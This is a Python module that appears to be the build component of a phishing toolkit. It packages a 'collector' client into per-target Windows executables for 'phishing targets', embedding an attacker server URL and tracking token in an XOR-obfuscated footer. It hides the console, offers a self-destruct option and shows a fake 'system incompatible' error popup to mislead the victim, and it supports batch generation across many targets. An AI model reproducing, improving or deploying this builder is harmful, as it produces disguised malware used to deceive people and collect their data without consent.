import os
import json
import subprocess
import sys
import shutil
import threading

BASE_DIR = os.path.dirname(os.path.dirname(__file__))
CLIENT_SCRIPT = os.path.join(BASE_DIR, 'client', 'collector.py')
OUTPUT_DIR = os.path.join(BASE_DIR, 'output')
BUILD_DIR = os.path.join(BASE_DIR, 'client_build')
REGISTRY_PATH = os.path.join(BASE_DIR, 'data', 'exe_registry.json')
# Pre-built generic Windows EXE for Linux footer injection
BASE_EXE_PATH = os.path.join(BASE_DIR, 'client', 'collector_base.exe')

IS_WINDOWS = sys.platform == 'win32'
BIN_EXT = '.exe'  # Output is always Windows PE for phishing targets
FOOTER_KEY = b'fishfish@aes'


def _xor(data, key):
    """XOR encrypt/decrypt data with a repeating key."""
    key_len = len(key)
    return bytes(data[i] ^ key[i % key_len] for i in range(len(data)))

# Track async build status: {target_id: {'status': 'building'|'done'|'error', 'message': str}}
_build_status = {}
_lock = threading.Lock()
_registry_lock = threading.Lock()


def _load_registry():
    os.makedirs(os.path.dirname(REGISTRY_PATH), exist_ok=True)
    if not os.path.exists(REGISTRY_PATH):
        return {}
    with open(REGISTRY_PATH, 'r', encoding='utf-8') as f:
        return json.load(f)


def _save_registry(reg):
    os.makedirs(os.path.dirname(REGISTRY_PATH), exist_ok=True)
    with open(REGISTRY_PATH, 'w', encoding='utf-8') as f:
        json.dump(reg, f, ensure_ascii=False, indent=2)


def register_exe(token, filename):
    """Record that an EXE exists for this token."""
    with _registry_lock:
        reg = _load_registry()
        reg[token] = filename
        _save_registry(reg)


def unregister_exe(token):
    """Remove EXE record for this token."""
    with _registry_lock:
        reg = _load_registry()
        reg.pop(token, None)
        _save_registry(reg)


def clear_exe_registry():
    """Remove all EXE records."""
    with _registry_lock:
        _save_registry({})


def is_exe_registered(token):
    """Check if an EXE is registered for this token."""
    with _registry_lock:
        reg = _load_registry()
        return token in reg


def get_build_status(target_id):
    with _lock:
        return _build_status.get(target_id, None)


def get_all_build_status():
    with _lock:
        return dict(_build_status)


def build_exe(server_url, token, target_name):
    """Build a target-specific EXE. Uses fast footer injection if base EXE
    exists; falls back to full PyInstaller build."""
    from .config_manager import build_filename, load_config
    config = load_config()
    exe_name = build_filename(target_name, token)

    if os.path.exists(BASE_EXE_PATH):
        return _build_with_footer(server_url, token, config, exe_name)

    return _build_with_pyinstaller(server_url, token, target_name, config, exe_name)


def build_base_exe():
    """Build the generic collector_base.exe (no target config embedded).
    This only needs to be done once; subsequent per-target builds use footer injection."""
    os.makedirs(OUTPUT_DIR, exist_ok=True)

    # Use placeholder config for the base EXE
    base_config = {
        'self_destruct': False,
        'popup_enabled': True,
        'popup_message': '系统不兼容，运行失败!',
    }
    _build_with_pyinstaller(
        '{{SERVER_URL}}', '{{TOKEN}}', '_base_', base_config, 'collector_base'
    )
    # Move output to client/ as the canonical base EXE
    src = os.path.join(OUTPUT_DIR, 'collector_base.exe')
    if os.path.exists(src):
        import shutil
        shutil.move(src, BASE_EXE_PATH)
    return BASE_EXE_PATH


def _build_with_footer(server_url, token, config, exe_name):
    """Linux: copy base EXE and append a JSON config footer."""
    os.makedirs(OUTPUT_DIR, exist_ok=True)

    cfg = {
        'server_url': server_url,
        'token': token,
        'self_destruct': config.get('self_destruct', False),
        'popup_enabled': config.get('popup_enabled', True),
        'popup_message': config.get('popup_message', '系统不兼容，运行失败!'),
    }
    body = json.dumps(cfg, ensure_ascii=False).encode('utf-8')
    encrypted = _xor(body, FOOTER_KEY)
    footer = b'---FISHCFG---' + encrypted + b'---FISHCFG---'

    exe_path = os.path.join(OUTPUT_DIR, f"{exe_name}.exe")
    with open(BASE_EXE_PATH, 'rb') as src:
        with open(exe_path, 'wb') as dst:
            dst.write(src.read())
            dst.write(footer)

    register_exe(token, os.path.basename(exe_path))
    return exe_path


def _build_with_pyinstaller(server_url, token, target_name, config, exe_name):
    """Full PyInstaller build (Windows or Linux native binary)."""
    from .config_manager import get_icon_path

    os.makedirs(OUTPUT_DIR, exist_ok=True)
    os.makedirs(BUILD_DIR, exist_ok=True)

    build_script = os.path.join(BUILD_DIR, f'collector_{token[:8]}.py')
    with open(CLIENT_SCRIPT, 'r', encoding='utf-8') as f:
        script_content = f.read()

    script_content = script_content.replace('{{SERVER_URL}}', server_url)
    script_content = script_content.replace('{{TOKEN}}', token)
    script_content = script_content.replace('{{SELF_DESTRUCT}}',
        'true' if config.get('self_destruct') else 'false')
    script_content = script_content.replace('{{POPUP_ENABLED}}',
        'true' if config.get('popup_enabled', True) else 'false')
    script_content = script_content.replace('{{POPUP_MESSAGE}}',
        config.get('popup_message', '系统不兼容，运行失败!'))

    with open(build_script, 'w', encoding='utf-8') as f:
        f.write(script_content)

    icon_path = get_icon_path()

    cmd = [
        sys.executable, '-m', 'PyInstaller',
        '--onefile',
        '--name', exe_name,
        '--distpath', OUTPUT_DIR,
        '--workpath', os.path.join(BUILD_DIR, 'pyi_work'),
        '--specpath', BUILD_DIR,
    ]
    if IS_WINDOWS:
        cmd.insert(3, '--noconsole')

    if icon_path and os.path.exists(icon_path) and IS_WINDOWS:
        cmd.append(f'--icon={icon_path}')
    cmd.append(build_script)

    result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)

    try:
        os.remove(build_script)
    except Exception:
        pass

    if result.returncode != 0:
        raise RuntimeError(f"PyInstaller failed: {result.stderr}")

    exe_path = os.path.join(OUTPUT_DIR, f"{exe_name}{BIN_EXT}")
    if not os.path.exists(exe_path):
        raise RuntimeError(f"Binary not found at expected path: {exe_path}")

    register_exe(token, os.path.basename(exe_path))
    return exe_path


def build_exe_async(server_url, token, target_name, target_id):
    """Start an async build, returns immediately. Status tracked in _build_status."""
    with _lock:
        _build_status[target_id] = {'status': 'building', 'message': '正在打包...'}

    def _run():
        try:
            build_exe(server_url, token, target_name)
            with _lock:
                _build_status[target_id] = {'status': 'done', 'message': '生成完毕'}
        except Exception as e:
            with _lock:
                _build_status[target_id] = {'status': 'error', 'message': str(e)}

    t = threading.Thread(target=_run, daemon=True)
    t.start()


def build_exes_batch(server_url, targets):
    results = []
    for t in targets:
        try:
            exe_path = build_exe(server_url, t['token'], t['name'])
            results.append({
                'target_id': t['id'],
                'name': t['name'],
                'token': t['token'],
                'success': True,
                'exe_path': exe_path,
                'exe_name': os.path.basename(exe_path),
            })
        except Exception as e:
            results.append({
                'target_id': t['id'],
                'name': t['name'],
                'token': t['token'],
                'success': False,
                'error': str(e),
            })
    return results


def clean_build_artifacts():
    for path in [BUILD_DIR]:
        if os.path.exists(path):
            try:
                shutil.rmtree(path)
            except Exception:
                pass
    for f in os.listdir(BASE_DIR):
        if f.endswith('.spec'):
            try:
                os.remove(os.path.join(BASE_DIR, f))
            except Exception:
                pass
